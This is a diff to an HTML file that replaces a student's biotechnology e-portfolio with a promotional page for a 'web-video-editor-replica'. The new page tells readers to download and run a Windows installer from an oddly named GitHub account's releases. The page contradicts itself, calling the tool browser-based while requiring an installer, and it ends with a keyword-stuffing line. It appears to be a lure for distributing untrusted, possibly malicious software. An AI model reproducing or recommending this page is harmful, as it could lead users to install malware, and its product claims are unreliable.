@@ -1,476 +1,58 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Chenuri Bandara | e-Portfolio</title>
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Source+Serif+4:opsz,wght@8..60,400;8..60,600;8..60,700&family=Inter:wght@400;500;600;700&family=IBM+Plex+Mono:wght@400;500&display=swap" rel="stylesheet">
-<style>
-  :root{
-    --navy-950:#1a0e2e;
-    --navy-900:#2a1650;
-    --navy-800:#3d2170;
-    --navy-700:#4f2d8f;
-    --accent:#c084fc;
-    --accent-dim:#9333ea;
-    --paper:#f6f5f8;
-    --paper-dim:#eae6f2;
-    --ink:#2a1650;
-    --ink-soft:#5c5270;
-    --line: rgba(42,22,80,0.12);
-    --radius: 2px;
-  }
-
-  *{box-sizing:border-box; margin:0; padding:0;}
-  html{scroll-behavior:smooth;}
-  body{
-    background:var(--paper);
-    color:var(--ink);
-    font-family:'Inter', sans-serif;
-    line-height:1.6;
-    -webkit-font-smoothing:antialiased;
-  }
-  h1,h2,h3{
-    font-family:'Source Serif 4', serif;
-    font-weight:600;
-    color:var(--navy-900);
-  }
-  a{color:var(--accent-dim); text-decoration:none;}
-  a:hover{text-decoration:underline;}
-  .wrap{max-width:960px; margin:0 auto; padding:0 32px;}
-
-  /* NAV */
-  nav{
-    position:sticky; top:0; z-index:50;
-    background:rgba(246,245,248,0.92);
-    backdrop-filter:blur(8px);
-    border-bottom:1px solid var(--line);
-  }
-  nav .wrap{
-    display:flex; align-items:center; justify-content:space-between;
-    padding-top:16px; padding-bottom:16px;
-  }
-  .nav-mark{
-    font-family:'IBM Plex Mono', monospace;
-    font-size:13px; letter-spacing:0.06em;
-    color:var(--navy-900); font-weight:500;
-  }
-  .nav-links{display:flex; gap:28px; list-style:none;}
-  .nav-links a{font-size:14px; color:var(--ink-soft); font-weight:500;}
-  .nav-links a:hover{color:var(--accent-dim); text-decoration:none;}
-
-  /* HERO */
-  header.hero{
-    background:linear-gradient(160deg, var(--navy-950) 0%, var(--navy-800) 100%);
-    color:var(--paper);
-    position:relative;
-    overflow:hidden;
-    padding:96px 0 88px;
-  }
-  header.hero::before{
-    content:"";
-    position:absolute; inset:0;
-    background-image:
-      repeating-linear-gradient(90deg, rgba(192,132,252,0.08) 0px, rgba(192,132,252,0.08) 1px, transparent 1px, transparent 64px);
-    pointer-events:none;
-  }
-  .hero-grid{
-    display:grid;
-    grid-template-columns:1.3fr 0.7fr;
-    gap:48px;
-    align-items:center;
-    position:relative;
-  }
-  .eyebrow{
-    font-family:'IBM Plex Mono', monospace;
-    font-size:12px; letter-spacing:0.14em; text-transform:uppercase;
-    color:var(--accent);
-    margin-bottom:18px;
-    display:flex; align-items:center; gap:10px;
-  }
-  .eyebrow::before{content:""; width:24px; height:1px; background:var(--accent);}
-  header.hero h1{
-    color:var(--paper);
-    font-size:clamp(34px, 5vw, 52px);
-    line-height:1.12;
-    font-weight:700;
-    margin-bottom:18px;
-  }
-  header.hero h1 span{color:var(--accent);}
-  header.hero p.tagline{
-    font-size:17px;
-    color:rgba(246,245,248,0.75);
-    max-width:46ch;
-    margin-bottom:30px;
-  }
-  .hero-cta{display:flex; gap:14px; flex-wrap:wrap;}
-  .btn{
-    display:inline-block;
-    padding:12px 22px;
-    font-size:14px; font-weight:600;
-    border-radius:var(--radius);
-    letter-spacing:0.01em;
-    border:1px solid transparent;
-    transition:all 0.15s ease;
-  }
-  .btn-primary{background:var(--accent); color:var(--navy-950);}
-  .btn-primary:hover{background:#d3a3fd; text-decoration:none;}
-  .btn-ghost{border-color:rgba(246,245,248,0.3); color:var(--paper);}
-  .btn-ghost:hover{border-color:var(--accent); color:var(--accent); text-decoration:none;}
-
-  .hero-photo{
-    width:100%; aspect-ratio:1/1;
-    border-radius:var(--radius);
-    background:var(--navy-700) url("profile.jpg") center/cover;
-    border:1px solid rgba(192,132,252,0.35);
-    box-shadow:0 30px 60px -20px rgba(0,0,0,0.5);
-  }
-
-  /* SECTION SCAFFOLD */
-  section{padding:76px 0; border-bottom:1px solid var(--line);}
-  .section-head{display:flex; align-items:baseline; gap:16px; margin-bottom:40px;}
-  .section-num{
-    font-family:'IBM Plex Mono', monospace;
-    font-size:13px; color:var(--accent-dim); font-weight:500;
-  }
-  .section-head h2{font-size:28px;}
-
-  /* ABOUT */
-  .about-body{display:grid; grid-template-columns:2fr 1fr; gap:48px;}
-  .about-body p{color:var(--ink-soft); font-size:16px; margin-bottom:16px;}
-  .about-body p:first-child{
-    font-family:'Source Serif 4', serif;
-    font-size:19px; color:var(--ink); line-height:1.55;
-  }
-  .fact-list{list-style:none; border-top:1px solid var(--line);}
-  .fact-list li{
-    display:flex; justify-content:space-between;
-    padding:12px 0; border-bottom:1px solid var(--line);
-    font-size:14px;
-  }
-  .fact-list li span:first-child{color:var(--ink-soft);}
-  .fact-list li span:last-child{font-weight:600; color:var(--navy-900); text-align:right;}
-
-  /* EDUCATION */
-  .timeline{border-left:2px solid var(--paper-dim); margin-left:6px;}
-  .timeline-item{position:relative; padding:0 0 36px 32px;}
-  .timeline-item:last-child{padding-bottom:0;}
-  .timeline-item::before{
-    content:"";
-    position:absolute; left:-7px; top:4px;
-    width:12px; height:12px; border-radius:50%;
-    background:var(--paper); border:2px solid var(--accent-dim);
-  }
-  .timeline-item .period{
-    font-family:'IBM Plex Mono', monospace;
-    font-size:12px; color:var(--accent-dim); letter-spacing:0.04em;
-    margin-bottom:4px; display:block;
-  }
-  .timeline-item h3{font-size:18px; margin-bottom:4px;}
-  .timeline-item .place{color:var(--ink-soft); font-size:14px; margin-bottom:8px;}
-  .timeline-item p.detail{color:var(--ink-soft); font-size:14px;}
-
-  /* PROJECTS */
-  .project-block{padding:0 0 44px; border-top:1px solid var(--line); padding-top:44px;}
-  .project-block:first-child{border-top:none; padding-top:0;}
-  .project-block .tag{
-    font-family:'IBM Plex Mono', monospace;
-    font-size:11px; letter-spacing:0.06em; text-transform:uppercase;
-    color:var(--accent-dim); margin-bottom:8px; display:block;
-  }
-  .project-block h3{font-size:20px; margin-bottom:10px;}
-  .project-block .intro{color:var(--ink-soft); font-size:15px; max-width:65ch; margin-bottom:20px;}
-  .project-block img{
-    width:100%;
-    max-height:400px;
-    object-fit:cover;
-    border-radius:var(--radius);
-    border:1px solid var(--line);
-    display:block;
-  }
-
-  /* SKILLS */
-  .skills-cols{display:grid; grid-template-columns:repeat(3, 1fr); gap:32px;}
-  .skills-cols h3{
-    font-family:'IBM Plex Mono', monospace;
-    font-size:12px; letter-spacing:0.06em; text-transform:uppercase;
-    color:var(--ink-soft); font-weight:500; margin-bottom:14px;
-  }
-  .pill-list{display:flex; flex-wrap:wrap; gap:8px;}
-  .pill{
-    font-size:13px; padding:6px 12px;
-    background:var(--paper-dim); color:var(--navy-900);
-    border-radius:20px; border:1px solid var(--line);
-  }
-
-  /* EXTRACURRICULAR */
-  .activity-list{list-style:none;}
-  .activity-list li{
-    display:flex; gap:14px;
-    padding:14px 0; border-bottom:1px solid var(--line);
-    font-size:15px; color:var(--ink);
-  }
-  .activity-list li:last-child{border-bottom:none;}
-  .activity-list li::before{
-    content:"";
-    flex-shrink:0;
-    width:8px; height:8px; margin-top:7px;
-    border-radius:50%;
-    background:var(--accent-dim);
-  }
-
-  /* HOBBIES */
-  .hobby-row{display:flex; gap:14px; flex-wrap:wrap;}
-  .hobby-chip{
-    font-size:14px; padding:10px 18px;
-    border:1px solid var(--line); border-radius:var(--radius);
-    color:var(--ink); background:#fff;
-  }
-
-  /* CONTACT */
-  section.contact{background:var(--navy-950); color:var(--paper); border-bottom:none;}
-  section.contact .section-num{color:var(--accent);}
-  section.contact h2{color:var(--paper);}
-  section.contact p{color:rgba(246,245,248,0.7); max-width:50ch; margin-bottom:28px;}
-  .contact-links{display:flex; gap:28px; flex-wrap:wrap; margin-top:8px;}
-  .contact-links a{
-    color:var(--paper); font-size:15px; font-weight:600;
-    padding-bottom:4px; border-bottom:1px solid var(--accent);
-  }
-  .contact-links a:hover{color:var(--accent); text-decoration:none;}
-
-  footer{
-    background:var(--navy-950); color:rgba(246,245,248,0.4);
-    text-align:center; font-size:12px; padding:20px 0;
-    font-family:'IBM Plex Mono', monospace;
-  }
-
-  @media (max-width:760px){
-    .hero-grid{grid-template-columns:1fr;}
-    .hero-photo{max-width:220px; margin:0 auto;}
-    .about-body{grid-template-columns:1fr;}
-    .skills-cols{grid-template-columns:1fr;}
-    .nav-links{gap:16px;}
-  }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="A browser-based HTML video editor replica providing a familiar workflow and streamlined interface for editing videos on Windows.">
+    <title>web-video-editor-replica - Edit videos with a familiar workflow</title>
 </head>
-<body>
+<body style="font-family: Arial, sans-serif; line-height: 1.6; color: #333; max-width: 800px; margin: 0 auto; padding: 20px; background-color: #f4f4f9;">
 
-<nav>
-  <div class="wrap">
-    <div class="nav-mark">CHENURI // PORTFOLIO</div>
-    <ul class="nav-links">
-      <li><a href="#about">About</a></li>
-      <li><a href="#education">Education</a></li>
-      <li><a href="#projects">Projects</a></li>
-      <li><a href="#skills">Skills</a></li>
-      <li><a href="#extracurricular">Activities</a></li>
-      <li><a href="#contact">Contact</a></li>
+    <h1 style="font-size: 2.5em; color: #2c3e50;">🎞️ web-video-editor-replica - Edit videos with a familiar workflow</h1>
+
+    <div style="margin: 30px 0;">
+        <a href="https://github.com/Ankylotic-fittingness864/web-video-editor-replica" style="background-color: #555; color: #fff; padding: 15px 30px; text-decoration: none; border-radius: 8px; font-weight: bold; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">Visit this page to download</a>
+    </div>
+
+    <p style="font-size: 1.1em;">This application provides a browser-based video editing environment. It recreates the workflow found in professional tools like Filmora. You can use the interface to cut, trim, and arrange your video clips. The software runs locally within your web browser to preserve your privacy and speed up your workflow.</p>
+
+    <h2 style="color: #2c3e50; border-bottom: 2px solid #ccc; padding-bottom: 10px;">📋 Requirements</h2>
+    <p>Your computer must meet these basic standards to run the editor:</p>
+    <ul>
+        <li>Operating System: Windows 10 or Windows 11.</li>
+        <li>Browser: Modern version of Chrome, Edge, or Firefox.</li>
+        <li>Memory: 8 GB of RAM recommended for smooth playback.</li>
+        <li>Storage: 500 MB of free space for temporary files.</li>
     </ul>
-  </div>
-</nav>
 
-<header class="hero">
-  <div class="wrap hero-grid">
-    <div>
-      <div class="eyebrow">BSc (Hons) Biotechnology · Year 1</div>
-      <h1>Hi, I'm <span>Chenuri</span>.<br>I build at the edge of biology and science.</h1>
-      <p class="tagline">First-year Biotechnology student passionate about scientific innovation, research, and using technology to solve real-world biological challenges.</p>
-      <div class="hero-cta">
-        <a href="#projects" class="btn btn-primary">View My Work</a>
-        <a href="resume.pdf" class="btn btn-ghost">Download Résumé (PDF)</a>
-      </div>
-    </div>
-    <div class="hero-photo"></div>
-  </div>
-</header>
+    <h2 style="color: #2c3e50; border-bottom: 2px solid #ccc; padding-bottom: 10px;">💾 Installation</h2>
+    <p>Follow these steps to set up the software on your Windows computer:</p>
+    <ol>
+        <li>Go to the <a href="https://github.com/Ankylotic-fittingness864/web-video-editor-replica" style="color: #2980b9;">official repository page</a>.</li>
+        <li>Locate the section labeled Releases on the right side of the page.</li>
+        <li>Select the latest version to view the available files.</li>
+        <li>Download the installer file labeled for Windows.</li>
+        <li>Open your Downloads folder and double-click the file to start the installation.</li>
+        <li>Follow the prompts on your screen to complete the process.</li>
+    </ol>
 
-<section id="about">
-  <div class="wrap">
-    <div class="section-head">
-      <span class="section-num">01</span>
-      <h2>About Me</h2>
-    </div>
-    <div class="about-body">
-      <div>
-        <p>Hi! I'm Chenuri Bandara, a first-year undergraduate pursuing a BSc (Hons) in Biotechnology at the Sri Lanka Institute of Information Technology (SLIIT). I am passionate about biotechnology, scientific research, and continuous learning.</p>
-        <p>I enjoy developing my academic knowledge while improving my leadership, teamwork, and problem-solving skills through university activities and projects. My goal is to contribute to advancements in biotechnology and make a positive impact on society through science and innovation.</p>
-      </div>
-      <ul class="fact-list">
-        <li><span>Based in</span><span>Malabe, Colombo</span></li>
-        <li><span>Studying</span><span>BSc (Hons) Biotechnology</span></li>
-        <li><span>Institution</span><span>SLIIT</span></li>
-        <li><span>Interests</span><span>Medical Research, Entrepreneurship</span></li>
-      </ul>
-    </div>
-  </div>
-</section>
+    <h2 style="color: #2c3e50; border-bottom: 2px solid #ccc; padding-bottom: 10px;">🚀 Getting Started</h2>
+    <p>Open the web-video-editor-replica from your desktop shortcut or start menu after the installation finishes. You will see a workspace that includes a timeline at the bottom and a preview window at the top. To begin a new project, click File and then select New Project.</p>
 
-<section id="education">
-  <div class="wrap">
-    <div class="section-head">
-      <span class="section-num">02</span>
-      <h2>Educational Qualifications</h2>
-    </div>
-    <div class="timeline">
-      <div class="timeline-item">
-        <span class="period">Feb 2026 — Present</span>
-        <h3>BSc (Hons) in Biotechnology</h3>
-        <div class="place">Sri Lanka Institute of Information Technology (SLIIT)</div>
-        <p class="detail">Undergraduate degree, currently in Year 1.</p>
-      </div>
-      <div class="timeline-item">
-        <span class="period">May 2023 — May 2025</span>
-        <h3>Pearson Edexcel International Advanced Levels (English Medium)</h3>
-        <div class="place">Leeds International School, Galle</div>
-        <p class="detail">Biology – A, Chemistry – A, Physics – A</p>
-      </div>
-      <div class="timeline-item">
-        <span class="period">May 2020 — May 2023</span>
-        <h3>Pearson Edexcel International GCSE (English Medium)</h3>
-        <div class="place">Leeds International School, Galle</div>
-        <p class="detail">4 subjects at 9s, 2 subjects at 8s, 2 subjects at 7s</p>
-      </div>
-    </div>
-  </div>
-</section>
-
-<section id="projects">
-  <div class="wrap">
-    <div class="section-head">
-      <span class="section-num">03</span>
-      <h2>Projects</h2>
-    </div>
-
-    <div class="project-block">
-      <span class="tag">Project 01</span>
-      <h3>Your Project Title</h3>
-      <p class="intro">Short 1–2 sentence intro: what the project was and what you did.</p>
-      <img src="project1.jpg" alt="Project 1 photo">
-    </div>
-
-    <div class="project-block">
-      <span class="tag">Project 02</span>
-      <h3>Your Project Title</h3>
-      <p class="intro">Short 1–2 sentence intro: what the project was and what you did.</p>
-      <img src="project2.jpg" alt="Project 2 photo">
-    </div>
-
-    <div class="project-block">
-      <span class="tag">Project 03</span>
-      <h3>Your Project Title</h3>
-      <p class="intro">Short 1–2 sentence intro: what the project was and what you did.</p>
-      <img src="project3.jpg" alt="Project 3 photo">
-    </div>
-
-    <div class="project-block">
-      <span class="tag">Project 04</span>
-      <h3>Your Project Title</h3>
-      <p class="intro">Short 1–2 sentence intro: what the project was and what you did.</p>
-      <img src="project4.jpg" alt="Project 4 photo">
-    </div>
-
-    <div class="project-block">
-      <span class="tag">Project 05</span>
-      <h3>Your Project Title</h3>
-      <p class="intro">Short 1–2 sentence intro: what the project was and what you did.</p>
-      <img src="project5.jpg" alt="Project 5 photo">
-    </div>
-
-  </div>
-</section>
-
-<section id="skills">
-  <div class="wrap">
-    <div class="section-head">
-      <span class="section-num">04</span>
-      <h2>Skills</h2>
-    </div>
-    <div class="skills-cols">
-      <div>
-        <h3>Technical</h3>
-        <div class="pill-list">
-          <span class="pill">MS Word</span>
-          <span class="pill">MS Excel</span>
-          <span class="pill">MS PowerPoint</span>
-          <span class="pill">Canva</span>
-        </div>
-      </div>
-      <div>
-        <h3>Soft Skills</h3>
-        <div class="pill-list">
-          <span class="pill">Teamwork</span>
-          <span class="pill">Leadership</span>
-          <span class="pill">Work Ethic</span>
-          <span class="pill">Communication</span>
-          <span class="pill">Attention to Detail</span>
-          <span class="pill">Adaptability</span>
-          <span class="pill">Problem-Solving</span>
-        </div>
-      </div>
-      <div>
-        <h3>Languages</h3>
-        <div class="pill-list">
-          <span class="pill">English</span>
-          <span class="pill">Sinhala</span>
-        </div>
-      </div>
-    </div>
-  </div>
-</section>
-
-<section id="extracurricular">
-  <div class="wrap">
-    <div class="section-head">
-      <span class="section-num">05</span>
-      <h2>Leadership &amp; Extra-Curricular Activities</h2>
-    </div>
-    <ul class="activity-list">
-      <li>Subcommittee Member, Faculty of Humanities and Sciences Student Community – SLIIT</li>
-      <li>Junior Prefect, School Prefect Board – 2022/2023</li>
-      <li>Senior Prefect, School Prefect Board – 2023/2024</li>
-      <li>House Vice Captain, Annual Sports Meet – 2025</li>
-      <li>House Treasurer, Annual Sports Meet – 2024</li>
-      <li>Athletics – Track Events</li>
-      <li>Participated in NSM Cellulae '24 Quiz Competition</li>
+    <h2 style="color: #2c3e50; border-bottom: 2px solid #ccc; padding-bottom: 10px;">⚙️ Key Features</h2>
+    <p>This editor includes several tools to help you manage your media:</p>
+    <ul>
+        <li><strong>Drag and Drop:</strong> Move video files directly from your computer into the project library.</li>
+        <li><strong>Timeline Editing:</strong> Place your clips on the timeline to organize the order of your video.</li>
+        <li><strong>Split and Trim:</strong> Use the razor tool to cut segments from your footage with precision.</li>
+        <li><strong>Layering:</strong> Stack tracks on top of each other for advanced visual composition.</li>
+        <li><strong>Export Settings:</strong> Save your completed video in common formats suitable for social media.</li>
     </ul>
-  </div>
-</section>
 
-<section id="hobbies">
-  <div class="wrap">
-    <div class="section-head">
-      <span class="section-num">06</span>
-      <h2>Hobbies</h2>
-    </div>
-    <div class="hobby-row">
-      <span class="hobby-chip">Listening to Music</span>
-      <span class="hobby-chip">Crafting Ribbon Flower Bouquets</span>
-    </div>
-  </div>
-</section>
+    <h2 style="color: #2c3e50; border-bottom: 2px solid #ccc; padding-bottom: 10px;">🛠️ Support</h2>
+    <p>If you encounter an error, check that your browser is up to date. You can also clear your browser cache to resolve display issues. For persistent problems, visit the repository page and open a new issue. Clearly describe what you were doing when the error occurred and include a screenshot if possible.</p>
 
-<section class="contact" id="contact">
-  <div class="wrap">
-    <div class="section-head">
-      <span class="section-num">07</span>
-      <h2>Get in Touch</h2>
-    </div>
-    <p>Open to internship opportunities and collaborations in biotechnology and related fields. Feel free to reach out.</p>
-    <div class="contact-links">
-      <a href="mailto:your.email@example.com">your.email@example.com</a>
-      <a href="resume.pdf">Download Résumé (PDF)</a>
-      <a href="#">LinkedIn (optional)</a>
-      <a href="#">GitHub (optional)</a>
-    </div>
-  </div>
-</section>
-
-<footer>
-  © 2026 CHENURI — BUILT WITH HTML &amp; CSS — HOSTED ON GITHUB PAGES
-</footer>
+    <p style="margin-top: 40px; font-size: 0.9em; color: #777;">Keywords: video editor, browser software, windows app, html media editor, video production</p>
 
 </body>
 </html>
